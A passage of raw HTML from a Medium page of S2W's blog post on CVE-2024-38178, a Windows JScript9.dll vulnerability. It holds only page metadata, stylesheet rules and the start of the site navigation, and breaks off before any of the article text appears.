<!doctype html><html lang="en"><head><title data-rh="true">Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine | by S2W | S2W BLOG | Oct, 2024 | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2024-10-16T12:05:14.998Z"/><meta data-rh="true" name="title" content="Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine | by S2W | S2W BLOG | Oct, 2024 | Medium"/><meta data-rh="true" property="og:title" content="Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine"/><meta data-rh="true" property="al:android:url" content="medium://p/91ad954dbf83"/><meta data-rh="true" property="al:ios:url" content="medium://p/91ad954dbf83"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="(Vulnerability Overview) On August 13, 2024, Microsoft patched CVE-2024-38178, a vulnerability within JScript9.dll, as part of the August Patch Tuesday. (Vulnerability Cause) CVE-2024-38178 is a type…"/><meta data-rh="true" property="og:description" content="Author: Hosu Choi, Minyeop Choi | S2W Talon"/><meta data-rh="true" property="og:url" content="https://medium.com/s2wblog/unmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83"/><meta data-rh="true" property="al:web:url" content="https://medium.com/s2wblog/unmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*buHo6ydCb774gg64BFVRog.png"/><meta data-rh="true" property="article:author" content="https://s2w.medium.com"/><meta data-rh="true" name="author" content="S2W"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine"/><meta data-rh="true" name="twitter:site" content="@s2w_official"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/91ad954dbf83"/><meta data-rh="true" property="twitter:description" content="Author: Hosu Choi, Minyeop Choi | S2W Talon"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*buHo6ydCb774gg64BFVRog.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@S2W_Official"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="17 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://s2w.medium.com"/><link data-rh="true" rel="canonical" href="https://medium.com/s2wblog/unmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/91ad954dbf83"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*buHo6ydCb774gg64BFVRog.png"],"url":"https:\u002F\u002Fmedium.com\u002Fs2wblog\u002Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83","dateCreated":"2024-10-16T11:34:55.996Z","datePublished":"2024-10-16T11:34:55.996Z","dateModified":"2024-10-16T12:35:26.224Z","headline":"Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine","name":"Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine","description":"(Vulnerability Overview) On August 13, 2024, Microsoft patched CVE-2024-38178, a vulnerability within JScript9.dll, as part of the August Patch Tuesday. (Vulnerability Cause) CVE-2024-38178 is a type…","identifier":"91ad954dbf83","author":{"@type":"Person","name":"S2W","url":"https:\u002F\u002Fs2w.medium.com"},"creator":["S2W"],"publisher":{"@type":"Organization","name":"S2W BLOG","url":"https:\u002F\u002Fmedium.com\u002Fs2wblog","logo":{"@type":"ImageObject","width":60,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:120\u002F1*dAAOzI0wCWzr0K3RGg2Pzw.png"}},"mainEntityOfPage":"https:\u002F\u002Fmedium.com\u002Fs2wblog\u002Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83"}</script><style type="text/css" data-fela-rehydration="570" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="570" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:rgba(26, 137, 23, 1)}.es{border-color:rgba(26, 137, 23, 1)}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:rgba(26, 137, 23, 1)}.ez:disabled:hover{border-color:rgba(26, 137, 23, 1)}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-left:-12px}.ii{width:28px}.ij{height:28px}.ik{z-index:1}.il{width:24px}.im{margin-bottom:2px}.in{flex-wrap:nowrap}.io{font-size:16px}.ip{line-height:24px}.ir{margin:0 8px}.is{display:inline}.it{color:rgba(26, 137, 23, 1)}.iu{fill:rgba(26, 137, 23, 1)}.ix{flex:0 0 auto}.ja{flex-wrap:wrap}.jd{white-space:pre-wrap}.je{margin-right:4px}.jf{overflow:hidden}.jg{max-height:20px}.jh{text-overflow:ellipsis}.ji{display:-webkit-box}.jj{-webkit-line-clamp:1}.jk{-webkit-box-orient:vertical}.jl{word-break:break-all}.jn{padding-left:8px}.jo{padding-right:8px}.kp> *{flex-shrink:0}.kq{overflow-x:scroll}.kr::-webkit-scrollbar{display:none}.ks{scrollbar-width:none}.kt{-ms-overflow-style:none}.ku{width:74px}.kv{flex-direction:row}.kw{z-index:2}.kz{-webkit-user-select:none}.la{border:0}.lb{fill:rgba(117, 117, 117, 1)}.le{outline:0}.lf{user-select:none}.lg> svg{pointer-events:none}.lp{cursor:progress}.lq{opacity:1}.lr{padding:4px 0}.lu{margin-top:0px}.lv{width:16px}.lx{display:inline-flex}.md{max-width:100%}.me{padding:8px 2px}.mf svg{color:#6B6B6B}.mw{line-height:1.58}.mx{letter-spacing:-0.004em}.my{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nt{margin-bottom:-0.46em}.nu{box-shadow:inset 3px 0 0 0 #242424}.nv{padding-left:23px}.nw{margin-left:-20px}.nx{font-style:italic}.ny{line-height:1.12}.nz{letter-spacing:-0.022em}.oa{font-weight:600}.ov{margin-bottom:-0.28em}.pb{text-decoration:underline}.pc{list-style-type:disc}.pd{margin-left:30px}.pe{padding-left:0px}.pk{line-height:1.18}.py{margin-bottom:-0.31em}.pz{clear:both}.qf{margin-left:auto}.qg{margin-right:auto}.qh{max-width:1650px}.qn{padding-top:5px}.qo{padding-bottom:5px}.qq{cursor:zoom-in}.qr{z-index:auto}.qt{height:auto}.qu{margin-top:10px}.qv{max-width:728px}.qy{padding:2px 4px}.qz{font-size:75%}.ra> strong{font-family:inherit}.rb{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.rc{overflow-x:auto}.rd{padding:32px}.re{border:1px solid #E5E5E5}.rf{line-height:1.4}.rg{margin-top:-0.2em}.rh{margin-bottom:-0.2em}.ri{white-space:pre}.rj{min-width:fit-content}.rk{max-width:1500px}.rl{list-style-type:decimal}.rm{width:50.16%}.rn{margin-right:10px}.ro:last-of-type{margin-right:0}.rp{width:49.84%}.rq{width:200.99999999999997%}.rr{left:calc(-0.4999999999999858% - 8px)}.rs{transform:translateX(-50%)}.rt{max-width:1380px}.ru{max-width:1298px}.rv{max-width:752px}.rw{max-width:738px}.rx{max-width:1463px}.ry{max-width:1479px}.rz{max-width:1218px}.sa{max-width:1445px}.sb{margin-bottom:26px}.sc{margin-top:6px}.sd{margin-top:8px}.se{margin-right:8px}.sf{padding:8px 16px}.sg{border-radius:100px}.sh{transition:background 300ms ease}.sj{white-space:nowrap}.sk{border-top:none}.sq{height:52px}.sr{max-height:52px}.ss{box-sizing:content-box}.st{position:static}.sv{max-width:155px}.tb{margin-right:20px}.th{align-items:flex-end}.ti{width:76px}.tj{height:76px}.tk{border:2px solid #F9F9F9}.tl{height:72px}.tm{width:72px}.tn{margin-left:-16px}.to{width:36px}.tp{height:36px}.tq{color:rgba(255, 255, 255, 1)}.tr{fill:rgba(255, 255, 255, 1)}.ts{background:rgba(25, 25, 25, 1)}.tt{border-color:rgba(25, 25, 25, 1)}.tw:disabled{opacity:0.1}.tx:disabled:hover{background:rgba(25, 25, 25, 1)}.ty:disabled:hover{border-color:rgba(25, 25, 25, 1)}.tz{stroke:#F2F2F2}.ua{color:#F2F2F2}.ub{fill:#F2F2F2}.uc{background:#F2F2F2}.ud{border-color:#F2F2F2}.uj{font-weight:500}.uk{font-size:24px}.ul{line-height:30px}.um{letter-spacing:-0.016em}.un{margin-top:16px}.uo{height:0px}.up{border-bottom:solid 1px #E5E5E5}.uv{margin-top:72px}.uw{padding:24px 0}.ux{margin-bottom:0px}.uy{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:rgba(15, 115, 12, 1)}.eu:hover{border-color:rgba(15, 115, 12, 1)}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.iq:hover{text-decoration:underline}.iv:hover:not(:disabled){color:rgba(15, 115, 12, 1)}.iw:hover:not(:disabled){fill:rgba(15, 115, 12, 1)}.ld:hover{fill:rgba(8, 8, 8, 1)}.ls:hover{fill:#000000}.lt:hover p{color:#000000}.lw:hover{color:#000000}.mg:hover svg{color:#000000}.si:hover{background-color:#F2F2F2}.tu:hover{background:#000000}.tv:hover{border-color:#242424}.ue:hover{background:#F2F2F2}.uf:hover{border-color:#F2F2F2}.ug:hover{cursor:wait}.uh:hover{color:#F2F2F2}.ui:hover{fill:#F2F2F2}.bd:focus-within path{fill:#242424}.lc:focus{fill:rgba(8, 8, 8, 1)}.mh:focus svg{color:#000000}.qs:focus{transform:scale(1.01)}.lh:active{border-style:none}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:68px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.kb{border-top:solid 1px #F2F2F2}.kc{border-bottom:solid 1px #F2F2F2}.kd{margin:32px 0 0}.ke{padding:3px 8px}.kn> *{margin-right:24px}.ko> :last-child{margin-right:0}.lo{margin-top:0px}.mc{margin:0}.np{font-size:20px}.nq{margin-top:2.14em}.nr{line-height:32px}.ns{letter-spacing:-0.003em}.or{font-size:24px}.os{margin-top:1.95em}.ot{line-height:30px}.ou{letter-spacing:-0.016em}.pa{margin-top:0.94em}.pj{margin-top:1.14em}.pv{margin-top:1.72em}.pw{line-height:24px}.px{letter-spacing:0}.qe{max-width:1192px}.qm{margin-top:56px}.sp{margin-bottom:88px}.ta{display:inline-block}.tg{padding-top:72px}.uu{margin-top:40px}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ln{margin-top:0px}.qw{margin-left:auto}.qx{text-align:center}.sz{display:inline-block}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lm{margin-top:0px}.sy{display:inline-block}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.lk{margin-top:0px}.ll{margin-right:0px}.sx{display:inline-block}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:4px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.iy{flex-direction:column}.jb{margin-bottom:2px}.jp{margin:24px -24px 0}.jq{padding:0}.kf> *{margin-right:8px}.kg> :last-child{margin-right:24px}.kx{margin-left:0px}.li{margin-top:0px}.lj{margin-right:0px}.ly{margin:0}.mi{border:1px solid #F2F2F2}.mj{border-radius:99em}.mk{padding:0px 16px 0px 12px}.ml{height:38px}.mm{align-items:center}.mo svg{margin-right:8px}.mz{font-size:18px}.na{margin-top:1.56em}.nb{line-height:28px}.nc{letter-spacing:-0.003em}.ob{font-size:20px}.oc{margin-top:1.2em}.od{line-height:24px}.oe{letter-spacing:0}.ow{margin-top:0.67em}.pf{margin-top:1.34em}.pl{font-size:16px}.pm{margin-top:1.23em}.qa{max-width:100%}.qi{margin-top:40px}.sl{margin-bottom:80px}.sw{display:inline-block}.tc{padding-top:48px}.uq{margin-top:32px}.mn:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:68px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jx{border-top:solid 1px #F2F2F2}.jy{border-bottom:solid 1px #F2F2F2}.jz{margin:32px 0 0}.ka{padding:3px 8px}.kl> *{margin-right:24px}.km> :last-child{margin-right:0}.mb{margin:0}.nl{font-size:20px}.nm{margin-top:2.14em}.nn{line-height:32px}.no{letter-spacing:-0.003em}.on{font-size:24px}.oo{margin-top:1.95em}.op{line-height:30px}.oq{letter-spacing:-0.016em}.oz{margin-top:0.94em}.pi{margin-top:1.14em}.ps{margin-top:1.72em}.pt{line-height:24px}.pu{letter-spacing:0}.qd{max-width:1192px}.ql{margin-top:56px}.so{margin-bottom:88px}.tf{padding-top:72px}.ut{margin-top:40px}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:68px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jt{border-top:solid 1px #F2F2F2}.ju{border-bottom:solid 1px #F2F2F2}.jv{margin:32px 0 0}.jw{padding:3px 8px}.kj> *{margin-right:24px}.kk> :last-child{margin-right:0}.ma{margin:0}.nh{font-size:20px}.ni{margin-top:2.14em}.nj{line-height:32px}.nk{letter-spacing:-0.003em}.oj{font-size:24px}.ok{margin-top:1.95em}.ol{line-height:30px}.om{letter-spacing:-0.016em}.oy{margin-top:0.94em}.ph{margin-top:1.14em}.pp{margin-top:1.72em}.pq{line-height:24px}.pr{letter-spacing:0}.qc{max-width:100%}.qk{margin-top:56px}.sn{margin-bottom:88px}.te{padding-top:72px}.us{margin-top:40px}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:4px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iz{flex-direction:column}.jc{margin-bottom:2px}.jr{margin:24px 0 0}.js{padding:0}.kh> *{margin-right:8px}.ki> :last-child{margin-right:8px}.ky{margin-left:0px}.lz{margin:0}.mp{border:1px solid #F2F2F2}.mq{border-radius:99em}.mr{padding:0px 16px 0px 12px}.ms{height:38px}.mt{align-items:center}.mv svg{margin-right:8px}.nd{font-size:18px}.ne{margin-top:1.56em}.nf{line-height:28px}.ng{letter-spacing:-0.003em}.of{font-size:20px}.og{margin-top:1.2em}.oh{line-height:24px}.oi{letter-spacing:0}.ox{margin-top:0.67em}.pg{margin-top:1.34em}.pn{font-size:16px}.po{margin-top:1.23em}.qb{max-width:100%}.qj{margin-top:40px}.sm{margin-bottom:80px}.td{padding-top:48px}.ur{margin-top:32px}.mu:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="print">.su{display:none}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.jm{max-height:none}</style><style type="text/css" data-fela-rehydration="570" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.qp{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F91ad954dbf83&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderCollection&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2Fs2wblog%2Funmasking-cve-2024-38178-the-silent-threat-of-windows-scripting-engine-91ad954dbf83&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="/?source=---top_nav_layout_nav----------------------------------"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 